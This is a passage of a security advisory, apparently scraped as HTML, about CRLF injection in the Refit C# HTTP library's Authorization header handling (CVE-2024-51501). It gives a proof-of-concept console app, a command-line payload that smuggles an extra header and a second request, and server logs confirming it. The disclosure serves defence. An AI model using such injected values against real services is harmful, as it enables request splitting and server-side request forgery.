In general, CRLF-injection into a HTTP header (when using HTTP/1.1) means that one can inject additional HTTP headers or smuggle whole HTTP requests.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The below example code creates a console app that takes one command line variable (a bearer token) and then makes a request to some status page with the provided token inserted in the \"Authorization\" header:</p>\n<pre><code class=\"language-c#\">using Refit;\n\ninternal class Program\n{\n    private static void Main(string[] args)\n    {\n        // Usage: dotnet run &lt;bearer token&gt; \n        string token = args[0];\n        var service = RestService.For&lt;IStatusApi&gt;(\"http://insert.some.site.here\");\n        string response = service.GetStatus(token).Result;\n        Console.WriteLine($\"Response: {response}\");\n    }\n\n    public interface IStatusApi\n    {\n        [Get(\"/status\")]\n        Task&lt;string&gt; GetStatus([Authorize(\"Bearer\")] string token);\n    }\n}\n</code></pre>\n<p>This application is now vulnerable to CRLF-injection, and can thus be abused to for example perform request splitting and thus server side request forgery (SSRF):</p>\n<pre><code class=\"language-bash\">anonymous@ubuntu-sofia-672448:~$ dotnet Refit-cli.dll $'test\\r\\nUser-Agent: injected header!\\r\\n\\r\\nGET /smuggled HTTP/1.1\\r\\nHost: insert.some.site.here'\nResponse: &lt;html&gt;&lt;/html&gt;\n</code></pre>\n<p>The application intends to send a single request of the form:</p>\n<pre><code class=\"language-http\">GET /status HTTP/1.1\nHost: insert.some.site.here\nAuthorization: Bearer &lt;bearer token&gt;\n</code></pre>\n<p>But as the application is vulnerable to CRLF injection the above command will instead result in the following two requests being sent:</p>\n<pre><code class=\"language-http\">GET /status HTTP/1.1\nHost: insert.some.site.here\nAuthorization: Bearer test\nUser-Agent: injected header!\n</code></pre>\n<p>and</p>\n<pre><code class=\"language-http\">GET /smuggled HTTP/1.1\nHost: insert.some.site.here\n</code></pre>\n<p>This can be confirmed by checking the access logs on the server where these commands were run (with <code>insert.some.site.here</code> pointing to localhost):</p>\n<pre><code class=\"language-bash\">anonymous@ubuntu-sofia-672448:~$ sudo tail /var/log/apache2/access.log\n127.0.0.1 - - [29/Aug/2024:12:17:34 +0000] \"GET /status HTTP/1.1\" 200 240 \"-\" \"injected header!\"\n127.0.0.1 - - [29/Aug/2024:12:17:34 +0000] \"GET /smuggled HTTP/1.1\" 404 436 \"-\" \"-\"\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>If an application using the Refit library passes a user-controllable value through to a header, then that application becomes vulnerable to CRLF-injection. This is not necessarily a security issue for a command line application like the one above, but if such code were present in a web application then it becomes vulnerable to request splitting (as shown in the PoC) and thus Server Side Request Forgery.</p>\n<p>Strictly speaking this is a potential vulnerability in applications using Refit, not in Refit itself, but I would argue that at the very least there needs to be a warning about this behaviour in the Refit documentation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7\">https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7</a></li>\n<li><a href=\"https://github.com/reactiveui/refit/commit/483b1d8df18098f137ca0eca056b7e9ec19f70dd\">https://github.com/reactiveui/refit/commit/483b1d8df18098f137ca0eca056b7e9ec19f70dd</a></li>\n<li><a href=\"https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328\">https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51501\">https://nvd.nist.gov/vuln/detail/CVE-2024-51501</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3hxg-fxwm-8gf7\">https://github.com/advisories/GHSA-3hxg-fxwm-8gf7</a></li>\n</ul>\n",
